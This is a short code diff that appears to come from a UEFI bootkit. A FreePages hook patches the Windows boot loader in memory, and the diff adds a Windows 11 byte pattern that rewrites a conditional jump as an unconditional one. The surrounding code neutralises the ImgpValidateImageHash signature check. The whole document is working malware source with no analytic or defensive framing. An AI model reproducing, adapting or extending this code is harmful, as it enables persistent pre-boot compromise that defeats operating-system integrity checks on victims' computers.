@@ -91,6 +91,14 @@ D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN U
                     {
                         *( PUINT8 )( U_PTR( Adr ) ) = ( UINT8 )( 0xEB ); /* jmp */
                     }
+                    /* Another for Windows 11 */
+                    /* jz short loc_1800A8CD4 -> jmp short loc_1800A8CD4 */
+                    else if ( Adr[ 0x00 ] == 0x66 &&
+                              Adr[ 0x01 ] == 0xB8 &&
+                              Adr[ 0x02 ] == 0xFF )
+                    {
+                        *( PUINT8 )( U_PTR( Adr - 0x1 ) ) = ( UINT8 )( 0xEB ); /* jmp */
+                    }
 
                     /* call ImgpValidateImageHash -> xor eax, eax */
                     if ( Adr[ 0x00 ] == 0xD8 &&
@@ -120,3 +128,4 @@ LEAVE:
     /* Execute original routine */
     return ( ( D_API( FreePagesHook ) )( Gen->FreePages ) )( Memory, Pages );
 } E_SEC;
+
